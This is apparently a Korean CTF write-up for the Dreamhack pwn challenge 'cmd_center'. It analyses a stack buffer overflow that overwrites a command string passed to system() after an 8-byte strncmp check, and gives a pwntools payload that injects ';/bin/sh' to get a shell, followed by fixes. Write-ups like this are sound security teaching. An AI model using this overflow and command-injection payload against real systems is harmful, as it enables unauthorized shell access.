# cmd_center - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: cmd_center.c, cmd_center(ELF)
- tools:
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec cmd_center
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```
### Code
``` c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

int main() {
	char cmd_ip[256] = "ifconfig"; // 0x100
	int dummy;
	char center_name[24]; // 18

	init();

	printf("Center name: ");
	read(0, center_name, 100);


	if( !strncmp(cmd_ip, "ifconfig", 8)) {
		system(cmd_ip);
	}
	else {
		printf("Something is wrong!\n");
	}
	exit(0);
}
```
### strncmp
``` c
if( !strncmp(cmd_ip, "ifconfig", 8)) {
    system(cmd_ip);
}
```
`cmd_ip`와 `"ifconfig"`를 8바이트 비교한다. 초기 8바이트가 동일하다면 `com_ip`의 내용을 `system`으로 실행한다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
read(0, center_name, 100); // center_name size = 24
```
`center_name`의 크기는 24인 반면, `read`로 읽는 크기는 100으로 76만큼 초과한다. BOF 취약점이 발생하여 `center_name` 범위를 넘어선 상위 주소에 임의 값을 덮을 가능성이 존재한다.  
### Command Injection
``` c
if( !strncmp(cmd_ip, "ifconfig", 8)) {
    system(cmd_ip);
}
```
`strncmp`는 초기 8바이트만 `cmd_ip`가 `"ifconfig"`와 같은지 확인하므로 그 이후에 어떤 값이 오든 상관이 없다. 따라서 `cmd_ip` 8바이트 이후 값을 원하는 값을 덮어쓸 수 있다면 Command Injection 취약점이 발생할 수 있다.  
## Exploit
### Strategy
PIE, Full RELRO, NX 보호 기법이 모두 활성화 되어있다. 카나리는 비활성화 되어있는데, 마침 BOF 취약점이 존재한다. `center_name`에서 `cmd_ip`까지의 거리는 0x20이므로 `read`의 100 바이트에서 BOF를 통해 `cmd_ip`에 총 68바이트 만큼 덮어쓸 수 있다. 초기 8바이트만 `"ifconfig"`로 작성하고 그 이후에 메타 문자를 활용하여 Command Injection을 시도해 볼 수 있다.  
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rpb |  |
| dummy | -0x10 |
| cmd_ip | -0x110 |
| dummy | -0x118 |
| center_name | -0x130 |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 16581)
context.arch = "amd64"

# payload
payload = b''
payload += b'A' * 0x20 + b'ifconfig'
payload += b';/bin/sh'
p.sendlineafter(b'Center name: ', payload)

# interactive
p.interactive()
```
## Lessons Learned
### 1. User Input 
사용자의 입력을 제대로 검증하거나 필터링하지 않고 그대로 함수의 인자나 쿼리문에 사용할 경우 SQLi, Commandi, Path Traversal 등 공격이 발생한다. 어찌보면 단순하지만, 매우 큰 피해가 발생할 수 있는 공격이라는 점이 인상 깊다.  
## Mitigation Strategies(Remediation)
### 1. strncmp
만일 `strcmp`를 사용했다면 `ifconfig\x00???`과 같은 형식으로 `cmp_ip`를 변조할 수 밖에 없다. 그렇게 하면 `system("ifconfig\x00???")`은 ifconfig 명령어만 실행하고 바로 종료된다. 이유는 `\x00` NULL-byte가 존재해 그 이전의 문자열까지만 문자열로 인식하기 때문이다. 혹은 `strncmp(cmd_ip, "ifconfig", 9)`를 사용했다면 ifconfig 뒤에 `"\x00"`를 강제하기 떄문에 해당 공격을 방지할 수 있었을 것이다.  